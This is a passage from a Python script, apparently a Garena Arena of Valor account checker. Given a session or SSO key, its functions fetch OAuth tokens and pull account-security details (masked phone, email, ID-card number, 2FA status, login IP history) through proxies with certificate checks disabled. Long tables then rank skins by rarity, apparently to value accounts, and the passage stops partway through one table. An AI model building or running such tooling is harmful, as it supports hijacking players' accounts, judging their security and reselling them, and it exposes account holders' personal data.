        hdr, resp = _send_cmd(sock, CMD_FB_USER_INFO_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {"fb_linked": False}
        fields = _proto_decode(resp)
        if 1 in fields:
            fb = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
            fb_uid = fb.get(4, 0)
            if fb_uid:
                return {"fb_linked": True, "fb_uid": fb_uid}
        return {"fb_linked": False}
    except Exception:
        return {"fb_linked": False}


def _fetch_oauth_token(sock, session_key: bytes, app_id: int, response_type: int = 2) -> dict:
    """CMD 439: Get OAuth token for a specific app (response_type: 1=CODE, 2=TOKEN)."""
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, response_type) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info["access_token"] = fields[1].decode("utf-8") if isinstance(fields[1], bytes) else str(fields[1])
        if 4 in fields:
            info["open_id"] = fields[4].decode("utf-8") if isinstance(fields[4], bytes) else str(fields[4])
        return info
    except Exception:
        return {}


def _fetch_account_security(sso_key: str, proxy=None) -> dict:
    """Fetch masked phone, email, CCCD, authen from account.garena.com via SSO."""
    if not sso_key:
        return {}
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        ua = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"

        # 1. Exchange sso_key for cookies
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False, timeout=8, allow_redirects=False,
        )
        if resp.status_code != 200:
            return {}

        # 2. Account init data
        resp2 = sess.get(
            "https://account.garena.com/api/account/init",
            headers={"User-Agent": ua},
            verify=False, timeout=8,
        )
        if resp2.status_code != 200:
            return {}
        data = resp2.json()
        if "error" in data:
            return {}

        ui = data.get("user_info", {})
        info = {}

        phone = _first_value(ui, "mobile_no", "mobile", "phone", "phone_no")
        cc = _first_value(ui, "country_code", "country_calling_code")
        info["masked_phone"] = f"+{cc} {phone}" if (cc and phone and phone.replace("*", "")) else phone

        info["masked_email"] = _first_value(ui, "email", "email_address", "email_addr")
        info["email_v"] = _first_value(
            ui, "email_v", "email_verified", "is_email_verified", "email_bound"
        ) or 0
        info["mobile_bound"] = _first_value(
            ui, "mobile_bound", "mobile_verified", "is_mobile_bound"
        ) or 0
        info["idcard"] = ui.get("idcard", "")
        info["authenticator_enable"] = ui.get("authenticator_enable", 0)
        info["two_step_verify"] = ui.get("two_step_verify_enable", 0)
        info["fb_connected"] = _is_yes(ui.get("is_fbconnect_enabled"))
        info["fb_account"] = ui.get("fb_account")
        info["acc_country"] = ui.get("acc_country") or ""
        info["country"] = ui.get("country") or ""
        info["country_code"] = ui.get("country_code") or ""
        info["suspicious"] = 1 if ui.get("suspicious") else 0
        info["init_ip"] = data.get("init_ip", "")

        # Login history (last 5)
        raw_hist = data.get("login_history") or []
        hist = []
        for h in raw_hist[:5]:
            ts = int(h.get("timestamp", 0) or h.get("login_time", 0) or 0)
            dt_str = datetime.datetime.fromtimestamp(ts).strftime("%d-%m-%Y %H:%M") if ts else ""
            hist.append({
                "ip": h.get("ip", ""),
                "country": h.get("country", ""),
                "game": h.get("source", "") or h.get("game_name", "") or h.get("app_name", ""),
                "time": dt_str,
            })
        info["login_history"] = hist

        # Sensitive operations (last 5)
        raw_ops = data.get("sensitive_operation") or []
        ops = []
        for op in raw_ops[:5]:
            ts = int(op.get("timestamp", 0) or op.get("operation_time", 0) or op.get("op_time", 0) or 0)
            dt_str = datetime.datetime.fromtimestamp(ts).strftime("%d-%m-%Y %H:%M") if ts else ""
            ops.append({
                "type": op.get("operation", "") or op.get("operation_type", "") or op.get("op_type", ""),
                "ip": op.get("ip", ""),
                "time": dt_str,
            })
        info["sensitive_ops"] = ops
        return info
    except Exception:
        return {}


def _fetch_uac_country(sso_key: str, proxy=None) -> str:
    """Fetch UAC country code from shop.garena.sg using sso_key."""
    if not sso_key:
        return ""
    try:
        sess = requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.cookies.set("sso_key", sso_key)

        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_resp = sess.post(token_url, headers=token_headers, data=token_data, timeout=5, verify=False)
        access_token = token_resp.json().get("access_token")
        if access_token:
            inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
            inspect_resp = sess.post(inspect_url, json={"token": access_token}, timeout=5, verify=False)
            uac = inspect_resp.json().get("uac")
            if uac:
                return str(uac).strip().upper()
    except Exception:
        pass
    return ""


# ── Skin Tables & Classification ─────────────────────────────────────────────
# Generated skin tables

SKIN_SSS = {
    "10620": "Krixi Phù thủy thời không",
    "11101": "Violet Thứ nguyên vệ thần",
    "11119": "Violet Vọng nguyệt Long Cơ",
    "11607": "Butterfly Phượng Cửu Thiên",
    "12912": "Triệu Vân Minh Chung Long Đế",
    "13011": "Airi Bích hải thánh nữ",
    "13014": "Airi Thứ nguyên Vệ thần",
    "13116": "Murad Tuyệt thế thần binh",
    "13118": "Murad Thánh Luân Kiếm Thánh",
    "13210": "Hayate Tu Di Thánh Đế",
    "13314": "Valhein Thứ nguyên vệ thần",
    "13613": "Ilumia Lưỡng Nghi Long Hậu",
    "14111": "Lauriel Thứ nguyên vệ thần",
    "15009": "Nakroth thứ nguyên vệ thần",
    "15013": "Nakroth Quỷ thương liệp đế",
    "15015": "Nakroth Bạch diện chiến thương",
    "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
    "15412": "Yena Huyền cửu thiên",
    "15710": "Raz Bão vũ Cuồng lôi",
    "19007": "Tulen Chí tôn kiếm tiên",
    "19009": "Tulen Thần sứ ST.L-79",
    "19908": "Eland'orr Mộng Giới Thần Chủ",
    "50105": "Tel'Annas Thần sứ F.E.E-X1",
    "50108": "Tel'Annas Thứ nguyên vệ thần",
    "50112": "Tel'Annas Tân niên vệ thần",
    "50119": "Tel'Annas Lân Quang Thánh Diệu",
    "51015": "Liliana Ma Pháp Tối Thượng",
    "52011": "Veres Lưu ly Long mẫu",
    "52414": "Capheny Càn Nguyên Điện Chủ",
    "54307": "Aya Công chúa cầu vồng",
    "54804": "Bijan Kình thiên Long Kỵ",
}

SKIN_SS = {
    "10603": "Krixi Tiệc Bãi Biển", "10704": "Zephys Siêu việt",
    "10714": "Zephys Kỷ Nguyên Hổ Phách", "10801": "Gildur Tiệc Bãi Biển",
    "10802": "Gildur Tiệc Bãi Biển", "10912": "Veera A.I Love you", "10915": "Veera Thất Sát - Thượng Sinh",
    "11105": "Violet Tiệc bãi biển", "11106": "Violet Tiệc bãi biển",
    "11109": "Violet Vợ người ta", "11110": "Violet Vợ người ta",
    "11113": "Violet Huyết Ma Thần", "11115": "Violet Thần long tỷ tỷ", "11118": "Violet Huyết ma thần",
    "11202": "Yorn Thế Tử Nguyệt Tộc", "11204": "Yorn Long thần soái",
    "11212": "Yorn Vệ Binh ngân hà", "11604": "Butterfly Nữ Quái Nổi Loạn",
    "11611": "Butterfly Thánh nữ khởi nguyên", "11614": "Butterfly Kim ngư thần nữ", "11616": "Butterfly Thánh nữ khởi nguyên",
    "11619": "Butterfly Rockgirl Siêu Đẳng", "11808": "Alice Quân Nhạc Athanor", "12008": "Mina Linh Xà yêu vũ",
    "12011": "Mina Tiệc bãi biển", "12304": "Maloch Đại Tướng Robot", "12606": "Arduin Bạch vệ chiến giáp",
    "12608": "Arduin Ngạo Hổ Hàn Đao", "12801": "Lữ Bố Tiệc Bãi Biển", "12804": "Lữ Bố Tiệc Bãi Biển",
    "12806": "Lữ Bố Tư lệnh Robot", "12812": "Lữ Bố Cửu Thiên Lôi Thần", "12907": "Triệu Vân Kỵ sĩ tận thế",
    "12913": "Triệu Vân Chiến Thần Vô Song", "13005": "Airi Kiemono", "13006": "Airi Bạch Kiemono",
    "13008": "Airi Tiệc bãi biển", "13104": "Murad Siêu việt", "13107": "Murad Siêu việt 2.0",
    "13109": "Murad Chí tôn thần kiếm", "13204": "Hayate Tử thần vũ trụ",
    "13212": "Hayate Thống Soái Dạ Ưng", "13302": "Valhein Vũ khí tối thượng", "13313": "Valhein Đệ nhất thần thám",
    "13316": "Valhein Mã Hành Vạn Lý", "13609": "Ilumia Khải Huyền Thiên Hậu", "13612": "Ilumia Nộ hải Thiên ngư",
    "13705": "Paine Tử xà Bá tước", "14104": "Lauriel Thánh quang sứ", "14107": "Lauriel Tinh vân sứ",
    "14108": "Lauriel Tiệc bãi biển", "14109": "Lauriel thiên sứ công nghệ", "14110": "Lauriel Phi thiên",
    "14117": "Lauriel Vũ khúc miêu ảnh", "14118": "Lauriel Thiên nữ Dạ Ưng", "14120": "Lauriel Mã Đằng Cửu Thế",
    "14206": "Natalya Nghiệp Hoả Yêu Hậu", "14213": "Natalya Nguyệt Ảnh Kiếm Tiên",
    "14403": "Taara Tiệc bãi biển", "14404": "Taara Tiệc bãi biển", "14609": "Zill Siêu việt",
    "15004": "Nakroth Siêu Việt", "15007": "Nakroth Lôi Quang Sứ", "15202": "Điêu Thuyền Tiệc bãi biển",
    "15204": "Điêu Thuyền WaVe", "15211": "Điêu Thuyền Thất Tịch Tiên Tử", "15216": "Điêu Thuyền Tuế Hàn Đỗ Quyên",
    "15409": "Yena WaVe", "15413": "Yena Trấn Yêu Thần Lộc", "15611": "Aleister HLV bất bại",
    "15704": "Raz Chiến thần Muay Thái", "15705": "Raz Siêu việt", "15903": "Dolia Nhật Ký Tình Yêu",
    "15905": "Dolia Mã Khởi Thiên Ca", "16304": "Ryoma Samurai huyền thoại", "16311": "Ryoma Maple Frost",
    "16607": "Arthur Siêu Việt", "16703": "Ngộ Không Siêu việt",
    "16705": "Ngộ Không Siêu việt 2.0", "16709": "Ngộ Không Tân niên Võ Thần", "16710": "Ngộ Không Tân niên Võ Thần",
    "16711": "Ngộ Không Thần Giáp Xích Diễm", "16712": "Ngộ Không Tề Thiên Võ Thánh", "17106": "Cresht Bách Tướng Lão Tam",
    "17309": "Fennik Phong Tranh Thám Xuân", "17408": "Stuart Siêu Trùm phản diện", "17506": "Grakk Tiệc bãi biển",
    "18408": "Helen Bé Hoa Xuân", "18702": "Arum Vũ khúc long hổ", "18704": "Arum Vũ khúc thần sứ",
    "19002": "Tulen Tân Thần Thiên Hà", "19006": "Tulen Tân thần hoàng kim", "19010": "Tulen Hoả thần long tộc",
    "19012": "Tulen Tân niên vệ thần", "19013": "Tulen Tiêu Dao Vũ Thần", "19016": "Tulen Thiên Cơ Bạch Trạch",
    "19109": "Rouie Lữ hành Thời không", "19509": "Enzo Sát thần Bạch Hổ", "19605": "Elsu Sứ giả tận thế",
    "19609": "Elsu Trấn thiên phi hồ", "20601": "Charlotte Hexsword", "50110": "Astrid Tiệc bãi biển",
    "50111": "Tel'Annas Vũ khúc yêu hồ", "50117": "Tel'Annas Thiên Vũ Thần Long", "50120": "Tel'annas Kỷ Nguyên Hổ Phách",
    "50121": "Tel'annas Tiệc bãi biển", "50605": "Omen Đao phủ tận thế",
    "50613": "Omen Liệt Hỏa Thiên Cang", "51003": "Liliana Nguyệt mị ly", "51004": "Liliana Tiểu thơ anh đào",
    "51005": "Liliana Tân nguyệt mị ly",
    "51013": "Liliana Lưu Thủy Thần Long", "51208": "Rourke Bách Tướng Lão Đại",
    "51306": "Zata Chí tôn Tà Phượng", "51504": "Richter Kiếm thần Susanoo", "51802": "Quillen Đặc công mãng xà",
    "51808": "Quillen Nghịch thiên long đế", "51814": "Quillen Thẩm phán Trăng khuyết", "51904": "Annette Tiệc bãi biển",
    "52007": "Veres Kimono", "52014": "Veres Idol Giáng Sinh", "52108": "Florentino Bá vương Âm nhạc",
    "52113": "Florentino Kỷ Nguyên Hổ Phách", "52404": "Capheny Kimono",
    "52709": "Sephera Bách nhạn ngân linh", "52710": "Sephera Nova Stardust", "52908": "Volkath Ma Ảnh Thần Đao",
    "53104": "Keera Tiệc bãi biển", "53204": "Thorne Tiệc bãi biển", "53304": "Laville Xạ Thần Tinh Vệ",
    "53306": "Laville Tiệc bãi biển", "53309": "Laville Vệ binh giáng sinh", "53311": "Laville Thợ Săn Truy Ảnh",
    "53503": "Sinestrea Wave", "53513": "Sinestrea Định Vị Tuyệt Đối", "53603": "Aoi Tiệc bãi biển",
    "53611": "Aoi Bách thú triều Long",
    "53703": "Allain Tuyết sơn song kiếm", "54507": "Yue Hỗn Độn Thần Ma",
    "54607": "Teeri Vân Y Cẩm Tú", "54802": "Bijan Hoàng kim cơ giáp", "54805": "Bijan Lữ Hành Thời Không",
    "56301": "Heino Nhật Ký Tình Yêu", "56703": "Erin Tình yêu cổ tích",
    "56704": "Erin Huyễn Ảnh Mị Điệp", "59802": "Bolt Baron Thiên Phủ", "59901": "Billow Thiên Tướng - Độ Ách",
    "59902": "Billow T-Rex Bất Bại", "152103": "Điêu Thuyền Tiệc bãi biển", "152111": "Điêu Thuyền WaVe",
}

SKIN_ANIME = {
    # Sword Art Online (SAO)
    "53701": "Allain Kirito Hắc kiếm sĩ",
    "53702": "Allain Kirito",
    "11609": "Butterfly Asuna Tia chớp",
    "11610": "Butterfly Stacia",
    # Kimetsu no Yaiba (Demon Slayer)
    "54402": "Yan Tanjiro Kamado",
    "53107": "Keera Nezuko Kamado",
    "10709": "Zephys Inosuke Hashibira",
    "13112": "Murad Zenitsu Agatsuma",
    # Bleach
    "12808": "Lữ Bố Ichigo Kurosaki",
    "13111": "Murad Byakuya Kuchiki",
    "54002": "Bright Toshiro Hitsugaya",
    # Hunter x Hunter
    "15012": "Nakroth Killua",
    "19508": "Enzo Kurapika",
    "15711": "Raz Gon",
    "52110": "Florentino Hisoka",
    # Attack on Titan (AOT)
    "15016": "Nakroth Levi",
    "53612": "Aoi Mikasa",
    "52810": "Qi Annie Leonhart",
    "17108": "Cresht Eren Jaegar",
    # Jujutsu Kaisen (JJK)
    "19015": "Tulen Satoru Gojo",
    "11120": "Violet Nobara Kugisaki",
    "13706": "Paine Megumi Fushiguro",
    "59702": "Biron Yuji Itadori",
    "50118": "Tel'Annas Jujutsu Sorcerer",
    # One Punch Man
    "52204": "Errol Genos",
    # Sailor Moon
    "15212": "Eternal Sailor Moon",
    "11812": "Alice - Eternal Sailor Chibi Moon",
    "19906": "Eland'orr-Tuxedo",
    # Thám Tử Lừng Danh Conan
    "11215": "Yorn Conan Edogawa",
    "13213": "Hayate Siêu đạo chích Kid",
    # Tensei Shitara Slime Datta Ken
    "53806": "Iggy Rimuru Tempest",
    "52809": "Qi Milim Nava",
    "14412": "Taara Shion",
    # Sanrio & Bản Quyền Khác
    "54309": "Aya Cinnamoroll's Dream",
    "10916": "Veera My Melody's Love",
    "14214": "Natalya Kuromi's Heart",
    "16612": "Arthur Pompompurin's Oath",
    "16307": "Ryoma Ultraman",
    "52105": "Florentino SEVEN",
    "52407": "Capheny Harley Quinn",
}

SKIN_OTHER = {
    "10605": "Krixi Đêm Noel", "10612": "Krixi Quán quân", "10705": "Zephys Siêu việt",
    "10804": "Gildur Phán Quan", "11103": "Violet Đặc Vụ Tinh Nhuệ", "11108": "Violet Pháo hoa Neon Tuyệt sắc",
    "11111": "Violet Điệp Vụ Thần Tốc", "11302": "Chaugnar Quang Vinh", "11606": "Butterfly Tuyết Nhung Xà",
    "12402": "Ignis Quang Vinh", "12703": "Azzen'ka Quang Vinh 2.0", "12705": "Azzen'Ka Giáng sinh",
    "12802": "Lữ Bố Cận chiến Robot", "12903": "Triệu Vân Quang Vinh", "12906": "Triệu Vân Thần tài",
    "13114": "Murad S-Quang Vinh",
    "13402": "Skud Quang Vinh", "13502": "Thane Quang vinh",
    "13506": "Thane Khoảnh khắc vinh quang", "13601": "Kil'Groth Quang Vinh", "14106": "Lauriel Hoa khôi Giáng sinh",
    "15003": "Nakroth Siêu việt", "15006": "Nakroth Quán quân", "15602": "Aleister Quang Vinh",
    "15612": "Aleister S-Quang vinh",
    "16309": "Ryoma Đặc nhiệm Giáng sinh",
    "17301": "Fennik Nhà thám hiểm", "17704": "Lindis Quang Vinh",
    "18003": "Max Quang Vinh", "19001": "Tulen Nhà Thám Hiểm",
    "19102": "Rouie Quang Vinh", "19608": "Yena Vũ điệu Giáng sinh",
    "19909": "Eland'oor S-Quang vinh", "51105": "Ata Quang vinh", "52111": "Florentino S-Quang Vinh",
    "52410": "Capheny S-Quang Vinh", "52505": "Zip Ông trùm giáng sinh", "52605": "Celica S-Quang Vinh",
    "52907": "Volkath S - Quang vinh", "53110": "Keera Quán quân", "53203": "Thorne Quán quân",
    "53205": "Thorne Ước nguyện giáng sinh", "53508": "Sinestrea S-Quang vinh", "53607": "Aoi Quán quân",
    "54007": "Bright Nhà thám hiểm", "54204": "Tachi S-Vinh Quang",
    "51008": "Liliana WaVe", "51009": "Liliana WaVe", "54806": "Bijan Giai điệu Giáng Sinh",
}

SKIN_ID_MAP = {
    "10500": "Toro", "10501": "Toro Đặc cảnh NYPD", "10502": "Toro Trung Phong Cắm", "10503": "Toro Thần thoại Hy Lạp",
    "10504": "Toro Bạch mao Ngưu", "10505": "Toro Ngưu hải vương", "10506": "Toro Tử Lôi Thần Ngưu", "10507": "Toro Hiểm họa hỗn mang",
    "10508": "Toro Trâu siêu tốc", "10600": "Krixi", "10601": "Krixi Công chúa Bướm", "10602": "Krixi Xứ Sở Thần Tiên",
    "10603": "Krixi Tiệc Bãi Biển", "10604": "Krixi Cô Tiên Thỏ", "10605": "Krixi Phó văn nghệ", "10606": "Krixi Tiểu yêu nữ",
    "10607": "Krixi Hồ Thiên Nga", "10608": "Krixi Thần Thoại Hy Lạp", "10609": "Krixi Thủy Thủ", "10610": "Krixi Terrible Tornado",
    "10611": "Krixi Nàng tiên nổi loạn", "10612": "Krixi Quán quân", "10613": "Krixi Phù thủy thời không", "10614": "Krixi Uyên Ương Mộng Điệp",
    "10615": "Krixi Kimono", "10620": "Krixi Phù thủy thời không", "10700": "Zephys", "10701": "Zephys Oán linh",
    "10702": "Zephys Hiệp Sĩ Bí Ngô", "10703": "Zephys Dung Nham", "10704": "Zephys Siêu việt", "10705": "Zephys Phi thương",
    "10706": "Zephys Tư lệnh viễn chinh", "10707": "Zephys Hắc vô thường", "10708": "Zephys Inosuke Hashibira", "10709": "Zephys Đầu bếp Sashimi",
    "10710": "Zephys Nghệ nhân đồ chơi", "10711": "Zephys Đầu bếp Sashimi", "10712": "Zephys Đại ca đường phố", "10714": "Zephys Kỷ Nguyên Hổ Phách",
    "10800": "Gildur Skin 0", "10801": "Gildur phượt thủ", "10802": "Gildur Tiệc Bãi Biển", "10803": "Gildur Đại gia học viện",
    "10804": "Gildur Đại võ sư", "10805": "Gildur Thuyền trưởng râu bạc", "10806": "Gildur Bác học thiên tài", "10807": "Gildur Phù thủy Ba Tư",
    "10808": "Gildur Xích long", "10809": "Gildur PASULOL", "10812": "Gildur Jiji", "10900": "Veera",
    "10901": "Veera Cô giáo hắc ám", "10902": "Veera Nàng dơi tuyết", "10903": "Veera Y Tá Bạo Loạn", "10904": "Veera Thiên nga đen",
    "10905": "Veera Vũ hội Bóng đêm", "10906": "Veera Kimono", "10907": "Veera Đánh cắp trái tim", "10908": "Veera A.I Love you",
    "10909": "Veera Bách hoa tiên nữ", "10910": "Veera Phù thủy Hội họa", "10911": "Veera Thất Sát - Thượng Sinh", "10912": "Veera Góa phụ giả kim",
    "10913": "Veera My Melody‘s Love", "10914": "Veera Phù thủy Hội họa", "10915": "Veera Thất Sát - Thượng Sinh", "10916": "Veera My Melody's Love",
    "10917": "Veera Momo", "11000": "Kahlii", "11001": "Kahlii Cô dâu hắc ám", "11002": "Kahlii Kim cô giáo chủ",
    "11003": "Kahlii Quàng Khăn Đỏ", "11004": "Kahlii Siêu đầu bếp", "11005": "Kahlii Vũ hội Bóng đêm", "11006": "Kahlii Tử điệp",
    "11007": "Kahlii Linh Hoa thần nữ", "11008": "Kahlii Rối nước Thủy đình", "11100": "Violet", "11101": "Violet Thứ nguyên vệ thần",
    "11102": "Violet Nữ đặc cảnh", "11103": "Violet Nữ Hoàng Pháo Hoa", "11104": "Violet Mèo Siêu Quậy", "11105": "Violet Phi Công Trẻ",
    "11106": "Violet Tiệc bãi biển", "11107": "Violet Phó học tập", "11108": "Violet Pháo hoa Neon Tuyệt sắc", "11109": "Violet Vợ người ta",
    "11110": "Violet Đặc dị", "11111": "Violet Lam Tước", "11112": "Violet Tay súng siêu phàm", "11113": "Violet DJ câu hồn",
    "11114": "Violet Vọng nguyệt Long Cơ", "11115": "Violet Thần long tỷ tỷ", "11116": "Violet Tay súng siêu phàm", "11117": "Violet Huy chương Vàng",
    "11118": "Violet Huyết ma thần", "11119": "Violet Hoa thủy tiên", "11120": "Violet Nobara Kugisaki", "11200": "Yorn",
    "11201": "Yorn Cung thủ bóng đêm", "11202": "Yorn Đặc Nhiệm Swat", "11203": "Yorn Thế Tử Nguyệt Tộc", "11204": "Yorn Long thần soái",
    "11205": "Yorn Nam thần Giáng sinh", "11206": "Yorn Soái ca học đường", "11207": "Yorn Thần Thoại Hy Lạp", "11208": "Yorn Vệ Binh ngân hà",
    "11209": "Yorn Soái ca bãi biển", "11210": "Yorn Lục nguyệt cung", "11211": "Yorn Phá Vân tiễn", "11212": "Yorn Ký giả diệu kỳ",
    "11213": "Yorn Conan Edogawa", "11214": "Yorn Thương nhân Sa mạc", "11215": "Yorn Conan Edogawa", "11300": "Chaugnar",
    "11301": "Chaugnar Ác Mộng Sinh Hóa", "11302": "Chaugnar Quang Vinh", "11303": "Chaugnar Quân cảnh", "11304": "Chaugnar Ác Mộng Arcade",
    "11400": "Omega", "11401": "Omega Người máy xanh", "11402": "Omega Cỗ Máy Siêu Tốc", "11403": "Omega Hộ vệ ba bích",
    "11404": "Omega Hộ vệ Carano", "11405": "Omega Sứ Thanh Hoa", "11406": "Omega Samurai cơ hóa", "11500": "Jinna",
    "11501": "Jinna Đại Tư Tế", "11502": "Jinna Dạ xoa vương", "11503": "Jinna Hỏa nhãn ma vương", "11504": "Jinna Kim Giác",
    "11505": "Jinna Ma Thuật sĩ", "11506": "Jinna Mafia", "11600": "Butterfly", "11601": "Butterfly Thủy thủ",
    "11602": "Butterfly Xuân nữ ngổ ngáo", "11603": "Butterfly Teen Nữ Công Nghệ", "11604": "Butterfly Nữ Quái Nổi Loạn", "11605": "Butterfly Quận Chúa Đế Chế",
    "11606": "Butterfly Đông êm đềm", "11607": "Butterfly Phượng Cửu Thiên", "11608": "Butterfly Cẩm y vệ: Chu Tước", "11609": "Butterfly Asuna Tia chớp",
    "11610": "Butterfly Stacia", "11611": "Butterfly Thánh nữ khởi nguyên", "11612": "Butterfly Kim ngư thần nữ", "11613": "Butterfly Gánh anh đến cùng",
    "11614": "Butterfly Tình yêu nổi loạn", "11615": "Butterfly Rockgirl Siêu Đẳng", "11616": "Butterfly Thánh nữ khởi nguyên", "11617": "Butterfly Ninh Tần",
    "11618": "Butterfly Thỏ may mắn", "11619": "Butterfly Rockgirl Siêu Đẳng", "11700": "Ormarr", "11701": "Ormarr Cựu chiến binh",
    "11702": "Ormarr Thông Thỏa Thích", "11703": "Ormarr Giáo Viên Thể Hình", "11704": "Ormarr CĐV Cuồng nhiệt", "11705": "Ormarr Quỷ vệ",
    "11706": "Ormarr Chuyện của nhà nông", "11800": "Alice", "11801": "Alice Nhà chiêm tinh", "11802": "Alice Bé Gấu Tuyết",
    "11803": "Alice Xứ sở thần tiên", "11804": "Alice Dạ hội", "11805": "Alice Tiểu quỷ bí ngô", "11806": "Alice bé du xuân",
    "11807": "Alice Phi hành gia", "11808": "Alice Tiểu tiên tử", "11809": "Alice Butterfly Mansion Girl", "11810": "Alice - Eternal Sailor Chibi Moon",
    "11811": "Alice Xứ sở diệu kỳ", "11812": "Alice Ốc quế tinh nghịch", "11813": "Alice Quân nhạc Athanor", "11814": "Alice Tiên nữ mộng giới",
    "11900": "Mganga", "11901": "Mganga Hề cung đình", "11902": "Mganga Tiệc Bánh Kẹo", "11903": "Mganga Pháp sư mèo",
    "11904": "Mganga Nhà hóa học", "11905": "Mganga Độc toàn thân", "11906": "Mganga Quái tặc không gian", "11907": "Mganga Đèn Thần Hậu Đậu",
    "11908": "Mganga Doombot hủy diệt", "12000": "Mina", "12001": "Mina Tiểu thư đoạt hồn", "12002": "Mina Tiệc Bánh Kẹo",
    "12003": "Mina Kẹo hay ghẹo", "12004": "Mina Lưỡi hái hoàng kim", "12005": "Mina Chị đại lắm chiêu", "12006": "Mina Đào tạo siêu sao",
    "12007": "Mina Nữ thần Ai Cập", "12008": "Mina Linh Xà yêu vũ", "12009": "Mina Xích Huyết Diễm Quỷ", "12010": "Mina Cẩm y vệ Kim Ô",
    "12011": "Mina Tiệc bãi biển", "12100": "Marja", "12101": "Marja Linh Xà Tư Tế", "12102": "Marja Hỏa ngọc nữ vương",
    "12103": "Marja Lam Hải yêu hậu", "12104": "Marja Yêu nữ săn mồi", "12105": "Marja Chủ hôn", "12106": "Marja Phù Quang Mạc Ảnh",
    "12107": "Marja Hi Phi", "12300": "Maloch", "12301": "Maloch Tiệc hóa trang", "12302": "Maloch Ác Ma Địa Ngục",
    "12303": "Maloch Samurai Tử Sĩ", "12304": "Maloch Đại Tướng Robot", "12305": "Maloch Ông kẹ bí ngô", "12306": "Maloch Quỷ nhãn ma thể",
    "12307": "Maloch Đại ca Mukbang", "12308": "Maloch Vũ hội Bóng đêm", "12309": "Maloch Ác nhân vô tuyến", "12310": "Maloch Đao phủ Dạ Ưng",
    "12311": "Maloch Đấu Sĩ Đoạt Thẻ", "12400": "Ignis", "12401": "Ignis Hỏa Thuật Sư", "12402": "Ignis Quang Vinh",
    "12403": "Ignis Bắc băng vương", "12404": "Ignis Thầy tế mặt trời", "12405": "Ignis Thần mặt trời", "12406": "Ignis Nguyệt lão",
    "12407": "Ignis Vì sao con khóc", "12600": "Erin", "12601": "Erin Mộc tinh linh", "12602": "Erin Tình yêu cổ tích",
    "12603": "Erin Huyễn Ảnh Mị Điệp", "12604": "Erin Nhạc Công Phiêu Du", "12606": "Arduin Bạch vệ chiến giáp", "12608": "Arduin Ngạo Hổ Hàn Đao",
    "12700": "Azzen'Ka", "12701": "Azzen'Ka Linh Hồn Lữ Khách", "12702": "Azzen'ka Ghẹo hay kẹo", "12703": "Azzen'ka Quang Vinh 2.0",
    "12704": "Azzen'ka Quỷ diện lãng khách", "12705": "Azzen'Ka Giáng sinh", "12706": "Azzen'Ka U hồn sa mạc", "12707": "Azzen'Ka Tông đồ thần miếu",
    "12800": "Lữ Bố", "12801": "Lữ Bố Long Kỵ Sĩ", "12802": "Lữ Bố Kỵ Sĩ Âm Phủ", "12803": "Lữ Bố Đặc Nhiệm Swat",
    "12804": "Lữ Bố Tiệc Bãi Biển", "12805": "Lữ Bố Nam Vương", "12806": "Lữ Bố Tư lệnh Robot", "12807": "Lữ Bố Vũ điệu Samba",
    "12808": "Lữ Bố Thần Ngọc", "12809": "Lữ Bố Ichigo Kurosaki", "12810": "Lữ Bố Cửu Thiên Lôi Thần", "12811": "Lữ bố Hỏa long chiến thần",
    "12812": "Lữ Bố Cửu Thiên Lôi Thần", "12900": "Triệu Vân", "12901": "Triệu Vân Đoạt mệnh thương", "12902": "Triệu Vân Quý Công Tử",
    "12903": "Triệu Vân Quang Vinh", "12904": "Triệu Vân Dũng Sĩ Đồ Long", "12905": "Triệu Vân Chiến tướng mùa đông", "12906": "Triệu Vân Kỵ sĩ tận thế",
    "12907": "Triệu Vân Cẩm y vệ: Hỏa Long", "12908": "Triệu Vân Thần Tài", "12909": "Triệu Vân Minh Chung Long Đế", "12910": "Triệu Vân Tiến sĩ thiên tài",
    "12911": "Triệu Vân Chiến thần vô song", "12912": "Triệu Vân Minh Chung Long Đế", "12913": "Triệu Vân Chiến Thần Vô Song", "13000": "Airi",
    "13001": "Airi Ninja Xanh Lá", "13002": "Airi Thích Khách", "13003": "Airi Cấm Vệ Nguyệt Tộc", "13004": "Airi Kiemono",
    "13005": "Airi Bạch Kiemono", "13006": "Airi Phó kiếm đạo", "13007": "Airi Quái xế công nghệ", "13008": "Airi Tiệc bãi biển",
    "13009": "Airi Mỵ Hồ", "13010": "Airi Đặc công tử điệp", "13011": "Airi Lễ hội mùa xuân", "13012": "Airi Bích hải thánh nữ",
    "13013": "Airi Thánh nữ Xiêm La", "13014": "Airi Thứ nguyên Vệ thần", "13015": "Airi Búp bê Mộng mị", "13016": "Airi Ninja ẩm thực",
    "13017": "Airi Quản lý tài năng", "13100": "Murad", "13101": "Murad Thợ Săn Tiền Thưởng", "13102": "Murad M-TP Thần Tượng Học Đường",
    "13103": "Murad Thiên Tài Sân Cỏ", "13104": "Murad Siêu việt", "13105": "Murad Đồ thần đao", "13106": "Murad Đặc dị",
    "13107": "Murad Siêu việt 2.0", "13108": "Murad Điệp viên Anubis", "13109": "Murad Chí tôn thần kiếm", "13110": "Murad Dược Sĩ Tình yêu",
